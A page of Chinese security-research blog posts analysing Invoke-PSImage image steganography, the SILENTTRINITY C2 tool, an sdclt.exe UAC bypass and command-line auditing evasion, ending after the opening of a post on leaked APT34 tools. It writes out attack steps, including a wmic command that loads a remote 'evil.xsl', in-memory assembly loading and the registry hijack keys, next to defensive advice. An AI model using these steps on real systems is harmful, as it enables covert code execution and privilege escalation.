<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
</code></pre></div></div>

<p><strong>说明：</strong></p>

<p>随机数填充，可忽略</p>

<p>综上，新像素的修改过程为：</p>

<p>R： 高位不变，低4位填入随机数
G： 高位不变，低4位填入payload的低4位
B： 高位不变，低4位填入payload的高4位</p>

<h3 id="2读取rgb还原出payload">2、读取RGB，还原出payload</h3>

<p>对输出做一个简单的修改，读取第一个像素中的payload并还原</p>

<p>取第0个像素的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sal a New-Object;
Add-Type -AssemblyName "System.Drawing";
$g= a System.Drawing.Bitmap("C:\1\evil-kiwi.png");
$p=$g.GetPixel(0,0);
$p;
</code></pre></div></div>

<p>还原payload，输出payload的第一个字符，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$o = [math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15);
[math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15));
</code></pre></div></div>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<p>使用参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PSImage -Script .\test.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
</code></pre></div></div>

<p>test.ps1: 包含payload，例如”start calc.exe”</p>

<p>kiwi.jpg： 输入图片，像素数量需要大于payload长度</p>

<p>evil-kiwi.png: 输出图片路径</p>

<p>脚本执行后会输出读取 图片解密payload并执行的代码</p>

<p>实际演示略</p>

<h2 id="0x05-优化思路">0x05 优化思路</h2>
<hr>

<p>结合前面的分析，选择替换RGB中两个分量的低4位保存payload，会在一定程序上影响图片质量，可参照LSB隐写的原理只替换三个分量的最低位，达到人眼无法区别的效果</p>

<p>当然，该方法仅是隐写技术的一个应用，无法绕过Win10 的AMSI拦截</p>

<p>在Win10 系统上测试还需要考虑对AMSI的绕过</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Invoke-PSImage的代码进行分析，介绍加解密原理，分析优缺点，提出优化思路，帮助大家更好的进行学习研究</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 24, 2017
  </div>

  
</article><article class="post">
  <h1>SILENTTRINITY利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>SILENTTRINITY是由byt3bl33d3r开源的一款C2工具，通过C#实现，利用IronPython引擎来执行Python代码，十分值得研究。这款工具通过Python实现payload，不仅提高了效率，而且利用IronPython引擎从内存加载payload，更为隐蔽。</p>

<p>本文将要站在技术研究的角度，分析SILENTTRINITY的原理并进行扩展，最后给出防御检测的建议</p>

<p>地址：</p>

<p>https://github.com/byt3bl33d3r/SILENTTRINITY</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>SILENTTRINITY的简单使用</li>
  <li>SILENTTRINITY的实现细节</li>
  <li>C#利用IronPython调用Python的方法</li>
  <li>防御检测的建议</li>
</ul>

<h2 id="0x02-silenttrinity的简单使用">0x02 SILENTTRINITY的简单使用</h2>
<hr>

<p>操作方法同meterpreter相似</p>

<h3 id="1安装">1、安装</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/byt3bl33d3r/SILENTTRINITY.git
cd SILENTTRINITY
python3 -m pip install -r requirements.txt
python3 st.py
</code></pre></div></div>

<h3 id="2开启teamserver">2、开启teamserver</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 teamserver.py &lt;teamserver_ip&gt; &lt;teamserver_password&gt;
</code></pre></div></div>

<h3 id="3连接teamserver">3、连接teamserver</h3>

<p>python3 st.py wss://username:<teamserver_password>@<teamserver_ip>:5000</teamserver_ip></teamserver_password></p>

<h3 id="4开启监听">4、开启监听</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listeners
use http
options
start
</code></pre></div></div>

<h3 id="5生成payload">5、生成payload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stagers
list
use msbuild
generate http
</code></pre></div></div>

<h3 id="6启动方式之一">6、启动方式之一</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
</code></pre></div></div>

<h2 id="0x03-silenttrinity的实现细节">0x03 SILENTTRINITY的实现细节</h2>
<hr>

<p>源码的文件结构如下：</p>

<ul>
  <li>SILENTTRINITY，核心文件，C#开发，格式为exe</li>
  <li>SILENTTRINITY_DLL，内容同上，但格式为dll</li>
  <li>Server，控制端，包括多个Python实现的payload</li>
</ul>

<p>SILENTTRINITY和SILENTTRINITY_DLL功能相同，只是文件格式不同，所以这里以SILENTTRINITY为例</p>

<h3 id="1silenttrinity">1、SILENTTRINITY</h3>

<p>实现的功能可参照下图右半部分：</p>

<p><img src="https://user-images.githubusercontent.com/5151193/46646842-cd2b0580-cb49-11e8-9218-73226e977d58.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片引用自https://github.com/byt3bl33d3r/SILENTTRINITY</p>

<p>详细说明如下：</p>

<h4 id="1-启动ironpython引擎释放资源文件并导入python环境">1. 启动IronPython引擎，释放资源文件并导入Python环境</h4>

<p>资源文件名：IronPython.StdLib.2.7.9.zip</p>

<p>压缩包内的文件为Python的默认模块</p>

<p>如果安装了IronPython，压缩包的文件同默认安装路径下<code class="language-plaintext highlighter-rouge">C:\Program Files\IronPython 2.7\Lib</code>中的文件内容保持一致</p>

<p>IronPython下载地址：</p>

<p>https://github.com/IronLanguages/ironpython2/releases/tag/ipy-2.7.9</p>

<h4 id="2-从server下载stagezip">2. 从Server下载stage.zip</h4>

<p>stage.zip中包含五个文件：</p>

<ul>
  <li>IronPython.dll</li>
  <li>IronPython.Modules.dll</li>
  <li>Microsoft.Dynamic.dll</li>
  <li>Microsoft.Scripting.dll</li>
  <li>Main.py</li>
</ul>

<p>其中，前四个为IronPython引擎的依赖文件，Main.py为主体程序，用于接收控制命令，加载payload，回传输出结果</p>

<h4 id="3-利用ironpython调用python">3. 利用IronPython调用Python</h4>

<p>后面将会详细介绍</p>

<h3 id="2server">2、Server</h3>

<p>作为控制端</p>

<p>modules文件夹下包含所有支持的Python脚本</p>

<p>stagers文件夹下包含三种启动方式：</p>

<ul>
  <li>msbuild</li>
  <li>powershell</li>
  <li>wmic</li>
</ul>

<h4 id="1-msbuild">1. msbuild</h4>

<p>启动方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
</code></pre></div></div>

<p>流程：</p>

<p><code class="language-plaintext highlighter-rouge">msbuild.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.xml</code>-&gt;<code class="language-plaintext highlighter-rouge">C#</code></p>

<p>通过msbuild.exe加载msbuild.xml，这里使用了.NET Framework 4.0中支持了的新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码</p>

<p>msbuild.xml实现了将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(C#实现)</p>

<p>这个利用方法我在之前的文章有过利用分析：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/">《Use MSBuild To Do More》</a></p>

<h4 id="2-powershell">2. powershell</h4>

<p>启动方式：</p>

<p>执行powershell脚本</p>

<p>流程：</p>

<p><code class="language-plaintext highlighter-rouge">powershell.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.ps1</code>-&gt;<code class="language-plaintext highlighter-rouge">C#</code></p>

<p>同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(Powershell实现)，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
$type = $asm.GetType("ST")
$main = $type.GetMethod("Main")
</code></pre></div></div>

<p>表示加载exe中Main下的ST方法</p>

<p>这个利用方法我在之前的文章有过利用分析：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">《利用Assembly Load &amp; LoadFile绕过Applocker的分析总结》</a></p>

<h4 id="3-wmic">3. wmic</h4>

<p>启动方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\wbem\WMIC.exe os get /format:"evil.xsl"
</code></pre></div></div>

<p>或者</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\wbem\WMIC.exe os get /format:"https://example.com/evil.xsl"
</code></pre></div></div>

<p>流程：</p>

<p><code class="language-plaintext highlighter-rouge">wmic.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.xsl</code>-&gt;<code class="language-plaintext highlighter-rouge">javascript</code></p>

<p>通过wmic.exe加载wmic.xsl，wmic.xsl可以放在本地，也可以放在远程服务器</p>

<p>同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(JavaScript实现)</p>

<p>这个利用方法我在之前的文章有过利用分析：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">《利用wmic调用xsl文件的分析与利用》</a></p>

<h4 id="4-其他可供利用的方法">4. 其他可供利用的方法</h4>

<p>SILENTTRINITY未包括，此处作为扩展，例如：</p>

<ul>
  <li>regsvr32.exe，《Code Execution of Regsvr32.exe》</li>
  <li>rundll32.exe，<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/">《关于利用rundll32执行程序的分析》</a></li>
</ul>

<h2 id="0x04-c利用ironpython调用python的方法">0x04 C#利用IronPython调用Python的方法</h2>
<hr>

<p>需要使用IronPython，参考资料：</p>

<p>https://ironpython.net/</p>

<p>本节介绍一些基本用法，有助于进一步扩展SILENTTRINITY的功能</p>

<h3 id="1常用的基本脚本">1、常用的基本脚本</h3>

<p>下载安装IronPython：</p>

<p>https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler</p>

<p>开发工具： VS2015</p>

<p>新建C#工程，添加引用：</p>

<ul>
  <li>IronPyhon</li>
  <li>Microsoft.Scripting</li>
</ul>

<p><strong>注：</strong></p>

<p>编译后生成的exe在执行时需要以下依赖文件：</p>

<ul>
  <li>IronPython.dll</li>
  <li>IronPython.Modules.dll(有的工程不需要)</li>
  <li>Microsoft.Dynamic.dll</li>
  <li>Microsoft.Scripting.dll</li>
</ul>

<h4 id="1简单的hello-world程序调用testpy输出hello-world">1.简单的hello world程序，调用test.py，输出Hello World</h4>

<p>code1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            engine.ExecuteFile("test.py");

        }
    }
}
</code></pre></div></div>

<p>test.py:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print("Hello World")
</code></pre></div></div>

<h4 id="2向python脚本传参数并输出">2.向python脚本传参数并输出</h4>

<p>code2:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;
namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();

            var scope = engine.CreateScope();

            scope.SetVariable("argv", "Hello World");

            engine.ExecuteFile("test.py",scope);
        }
    }
}
</code></pre></div></div>

<p>test.py:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print('%s'%argv)
</code></pre></div></div>

<h4 id="3调用python脚本的main函数">3.调用python脚本的main函数</h4>

<p>code3:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            var scope = engine.CreateScope();
            engine.ExecuteFile("test.py",scope);

            dynamic main = scope.GetVariable("main");

            main();


        }
    }
}
</code></pre></div></div>

<p>test.py:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def main():
        print("Hello World")
if __name__ == '__main__':
	main("")
</code></pre></div></div>

<h4 id="4将python脚本的内容存储在变量中并执行">4.将python脚本的内容存储在变量中并执行</h4>

<p>code4:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string script = "print('%s'%argv)";
            var engine = Python.CreateEngine();
            var scope = engine.CreateScope();
            scope.SetVariable("argv", "Hello World");
            var sourceCode = engine.CreateScriptSourceFromString(script);
            sourceCode.Execute(scope);
        }
    }
}
</code></pre></div></div>

<h4 id="5python脚本支持第三方库">5.python脚本支持第三方库</h4>

<p>code5:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            engine.SetSearchPaths(new[] { "Lib" });
            engine.ExecuteFile("test.py");
        }
    }
}
</code></pre></div></div>

<p>找到IronPython的安装路径，默认为<code class="language-plaintext highlighter-rouge">C:\Program Files\IronPython 2.7</code></p>

<p>将其中的Lib目录复制到编译生成的IronPythonTest.exe的同级目录下</p>

<p>test.py:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
os.system("calc.exe")
</code></pre></div></div>

<h3 id="2使用ipyc将python脚本编译成exe">2、使用ipyc将python脚本编译成exe</h3>

<p>类似于py2exe的功能</p>

<p>源码：</p>

<p>https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler</p>

<p>编译好的文件可从IronPython的目录中获得</p>

<p>默认安装位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\IronPython 2.7\ipyc.exe
</code></pre></div></div>

<h2 id="0x05-防御检测">0x05 防御检测</h2>
<hr>

<p>SILENTTRINITY的启动程序本身不包含恶意的功能，只是从远程服务器下载文件并利用IronPython调用Python，这是一个完全正常的功能</p>

<p>启动方式上利用了Windows系统本身自带的程序(例如msbuild.exe,powershell.exe,wmic.exe,也可以扩展成regsvr32.exe或rundll32.exe)，较为隐蔽</p>

<p>但SILENTTRINITY需要发起网络连接，传输stage.zip和Python脚本，所以如果程序调用了IronPython并发起了网络连接，极有可能是存在风险的行为</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文分析了SILENTTRINITY的实现细节，提出了一些扩展的思路，介绍了C#利用IronPython调用Python的方法，结合SILENTTRINITY的特征，给出防御检测的建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  5, 2019
  </div>

  
</article><article class="post">
  <h1>Study Notes of using sdclt.exe to bypass UAC</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Matt Nelson‏ @enigma0x3在最近的文章中公开了一个绕过Win10 UAC的技巧，通过修改HKCU下的注册表键值实现对UAC的绕过，文章地址如下：</p>

<p>https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/</p>

<p>https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将对其进行测试，分享测试心得，整理该方法的攻防技巧</p>

<h2 id="0x02-原理">0x02 原理</h2>
<hr>

<p><strong>Sigcheck</strong></p>

<p>可用来查看exe文件的清单(manifest)</p>

<p><strong>下载地址：</strong></p>

<p>https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx</p>

<p>在Win10环境下，cmd下运行：</p>

<p><code class="language-plaintext highlighter-rouge">sigcheck.exe -m c:\windows\system32\sdclt.exe</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-0.png" alt="Alt text"></p>

<p>level=”requireAdministrator”</p>

<p>true代表可自动提升权限</p>

<p>在Win7环境下，同样使用Sigcheck查看sdclt.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-01.png" alt="Alt text"></p>

<p>level=”asInvoker”表示不会提升权限，这也就是不支持Win7的原因</p>

<p>接下来，使用ProcessMonitor监控sdclt.exe的启动过程，查找是否会调用其他程序</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<p>测试环境： Win 10 x64</p>

<p><strong>注：</strong></p>

<p>该方法只在Win10下测试成功</p>

<p>cmd下输入：</p>

<p><code class="language-plaintext highlighter-rouge">sdclt.exe</code></p>

<p>正常启动，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-1.png" alt="Alt text"></p>

<p>使用ProcessMonitor查看启动过程</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-2.png" alt="Alt text"></p>

<p>启动sdclt.exe的过程中会以High权限查找注册表键值<code class="language-plaintext highlighter-rouge">HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code></p>

<p>如果手动修改该注册表键值，填入参数，那么就能够实现UAC的绕过</p>

<p><strong>绕过方法如下：</strong></p>

<p>新建注册表键值：</p>

<p><code class="language-plaintext highlighter-rouge">HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code></p>

<p>并将默认值设置为<code class="language-plaintext highlighter-rouge">cmd.exe</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-3.png" alt="Alt text"></p>

<p>再次启动sdclt.exe，发现转而去执行cmd.exe，并且实现了对UAC的绕过，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>启动的exe不能加参数，否则失败</p>

<p>例如填入C:\Windows\System32\cmd.exe /c calc.exe，无法实现利用</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-5.png" alt="Alt text"></p>

<p>在实际利用的过程中，如果需要加参数，可通过先将参数写入脚本，再加载脚本的方式进行利用</p>

<p>为了更好的隐蔽，实现“无文件”利用，可以尝试寻找sdclt.exe是否存在支持传入参数的命令</p>

<p>Matt Nelson‏ @enigma0x3的第二篇文章就是解决了这个问题，文章地址如下：</p>

<p>https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/</p>

<p>修改注册表，劫持<code class="language-plaintext highlighter-rouge">/kickoffelev</code>传入的参数，实现“无文件”利用</p>

<p><strong>具体方法如下：</strong></p>

<p>新建注册表键值：</p>

<p><code class="language-plaintext highlighter-rouge">HKCU:\Software\Classes\exefile\shell\runas\command\</code></p>

<p>新建项<code class="language-plaintext highlighter-rouge">isolatedCommand</code>，类型<code class="language-plaintext highlighter-rouge">REG_SZ</code>，内容作为启动参数，可设置为<code class="language-plaintext highlighter-rouge">notepad.exe</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-6.png" alt="Alt text"></p>

<p>接着在cmd下输入：</p>

<p><code class="language-plaintext highlighter-rouge">sdclt.exe /KickOffElev</code></p>

<p>成功执行参数，启动notetad.exe，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-7.png" alt="Alt text"></p>

<p>参数换成regedit.exe，启动过程并未被UAC拦截，成功绕过</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-23/2-8.png" alt="Alt text"></p>

<p>但是通过创建注册表键值exefile\shell\runas\command\会影响其他正常exe程序的启动，所以在利用上需要先创建键值，执行sdclt.exe，之后再删除该键值</p>

<p>整个过程通过powershell实现，完整POC可参考：</p>

<p>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1</p>

<h2 id="0x04-防御和检测">0x04 防御和检测</h2>
<hr>

<p><strong>防御：</strong></p>

<p>UAC权限设置为“Always Notify”，那么该方法将会失效</p>

<p><strong>检测：</strong></p>

<p>监控注册表键值：</p>

<p><code class="language-plaintext highlighter-rouge">HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code></p>

<p><code class="language-plaintext highlighter-rouge">HKCU:\Software\Classes\exefile\shell\runas\command\</code></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 23, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows command line process auditing的绕过</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>command line process auditing是Windows的一项功能，开启该功能后，ID为4688的日志将会记录进程创建时的命令行参数</p>

<p>本文将要介绍通过修改进程参数绕过日志记录的方法，测试开源工具SwampThing，分享实现SwampThing的C语言代码，分析利用思路，给出防御建议</p>

<p>SwampThing的地址：</p>

<p>https://github.com/FuzzySecurity/Sharp-Suite/blob/master/SwampThing</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>实现原理</li>
  <li>开启command line process auditing的方法</li>
  <li>测试SwampThing</li>
  <li>通过c++实现SwampThing</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-实现原理">0x02 实现原理</h2>
<hr>

<p>方法上同创建傀儡进程类似，区别在于这个方法只修改新进程的CommandLine参数</p>

<p>关于傀儡进程的技术细节，可参考之前的文章: <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/">《傀儡进程的实现与检测》</a></p>

<h3 id="实现思路">实现思路：</h3>

<ol>
  <li>通过CreateProcess创建进程，传入参数lpCommandLine，传入参数CREATE_SUSPENDED使进程挂起</li>
  <li>修改新进程的Commandline参数</li>
  <li>通过ResumeThread唤醒进程，执行新的Commandline参数</li>
  <li>如果新进程没有退出，再将Commandline参数还原</li>
</ol>

<p>在具体实现上，还需要考虑以下问题：</p>

<h4 id="1进程的选择">1、进程的选择</h4>

<p>启动的进程需要能够加载Commandline参数，例如cmd.exe，powershell.exe，wmic.exe等</p>

<h4 id="2修改远程进程的commandline参数">2、修改远程进程的Commandline参数</h4>

<p>通过NtQueryInformationProcess找到远程进程的基地址，计算偏移获得Commandline参数的位置，再分别通过ReadProcessMemory和WriteProcessMemory对Commandline参数进行读写</p>

<p>补充：</p>

<p>修改当前进程的Commandline参数可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/MasqueradePEBtoCopyfile.cpp</p>

<h2 id="0x03-开启command-line-process-auditing">0x03 开启command line process auditing</h2>
<hr>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing</p>

<p>该功能默认关闭，需要手动配置来开启</p>

<p>1、执行gpedit.msc进入组策略</p>

<p>2、开启进程审核功能</p>

<p>英文系统：</p>

<p>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Configuration &gt; Detailed Tracking &gt; Audit Process Creation</p>

<p>中文系统：</p>

<p>计算机配置 &gt; 策略 &gt; Windows 设置 &gt; 安全设置 &gt; 高级审核配置 &gt; 详细跟踪&gt; 审核创建进程</p>

<p>3、开启事件日志的额外功能，记录命令行参数</p>

<p>英文系统：</p>

<p>Administrative Template &gt; System &gt; Audit Process Creation &gt; Include command line in process creation events</p>

<p>中文系统：</p>

<p>管理模板 &gt; 系统 &gt; 审核创建的进程 &gt; 在创建事件的过程中包含命令行</p>

<p>开启command line process auditing后，在Windows日志的Security分类下，ID为4688的日志记录进程创建信息</p>

<p>实例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-24/2-1.png" alt="Alt text"></p>

<p>通过命令行查询ID为4688的日志的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe security /f:text /q:*[System[(EventID=4688)]]
</code></pre></div></div>

<h2 id="0x04-测试swampthing">0x04 测试SwampThing</h2>
<hr>

<p>地址：</p>

<p>https://github.com/FuzzySecurity/Sharp-Suite/blob/master/SwampThing</p>

<p>使用c#编写</p>

<p>编译成功后需要以下三个文件:</p>

<ul>
  <li>SwampThing.exe</li>
  <li>CommandlLine.dll</li>
  <li>CommandLine.xml</li>
</ul>

<p>命令行参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SwampThing.exe -l C:\Windows\System32\notepad.exe -f C:\aaa.txt -r C:\bbb.txt
</code></pre></div></div>

<p>启动的notepad.exe将会加载C:\bbb.txt，但通过ProcessExplorer查看notepad.exe进程的参数为C:\aaa.txt</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-24/2-2.png" alt="Alt text"></p>

<p>开启command line process auditing后，ID为4688的日志记录notepad.exe进程参数为C:\aaa.txt</p>

<p>成功绕过command line process auditing，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-24/2-3.png" alt="Alt text"></p>

<p>SwampThing在实现上只针对执行后不自动退出的进程(例如notepad.exe)，也就是说，通过ResumeThread唤醒进程后会再次修改进程参数，将其还原</p>

<p>显而易见，对于执行后就退出的进程(例如cmd.exe /c)，通过ResumeThread唤醒进程后，无法再次修改进程参数，将会报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-24/2-4.png" alt="Alt text"></p>

<h2 id="0x05-通过c实现swampthing">0x05 通过c++实现SwampThing</h2>
<hr>

<p>我通过c++实现了和SwampThing类似的功能，但在细节上有以下不同：</p>

<ol>
  <li>通过ResumeThread唤醒进程后，不再还原进程参数，可适用于cmd.exe /c</li>
  <li>修改CreateProcess创建进程的参数，指定pStartupInfo-&gt;dwFlags和pStartupInfo-&gt;wShowWindow，隐藏启动进程的界面</li>
</ol>

<p>代码下载地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/ProcessCommandlineSpoofing.cpp</p>

<p>代码实现了以下功能：</p>

<ul>
  <li>执行命令cmd.exe /c start calc.exe</li>
  <li>开启command line process auditing后，ID为4688的日志记录的进程参数为cmd.exe /c start notepad.exe</li>
</ul>

<h2 id="0x06-利用思路">0x06 利用思路</h2>
<hr>

<p>这个方法可以用来隐藏进程的真实参数</p>

<p>在利用上，还可以选择wmic.exe，正如SwampThing提到的那样——使用wmic来加载一个xsl文件</p>

<p>通过wmic加载xsl文件的方法可参考我之前的两篇文章：<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">《Use msxsl to bypass AppLocker》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">《利用wmic调用xsl文件的分析与利用》</a></p>

<p>当然，SwampThing和我开源的C代码都需要修改以后才能实现通过wmic加载xsl</p>

<h2 id="0x07-防御建议">0x07 防御建议</h2>
<hr>

<p>相对于创建傀儡进程，这种方法不需要使用VirtualAllocEx申请新的内存，不需要通过SetThreadContext设置入口点</p>

<p>通过对比PE文件在本地和内存之间是否有区别也无法检测这种方法</p>

<p>在检测上可以尝试查看进程的父进程是否可疑</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文介绍了通过修改进程参数绕过command line process auditing的方法，测试开源工具SwampThing，分享实现SwampThing的C语言代码，分析利用思路，最后给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 24, 2019
  </div>

  
</article><article class="post">
  <h1>对APT34泄露工具的分析——PoisonFrog和Glimpse</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近APT34的6款工具被泄露，本文仅在技术角度对其中的PoisonFrog和Glimpse进行分析</p>

<p>参考资料：</p>

<p>https://malware-research.org/apt34-hacking-tools-leak/amp/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

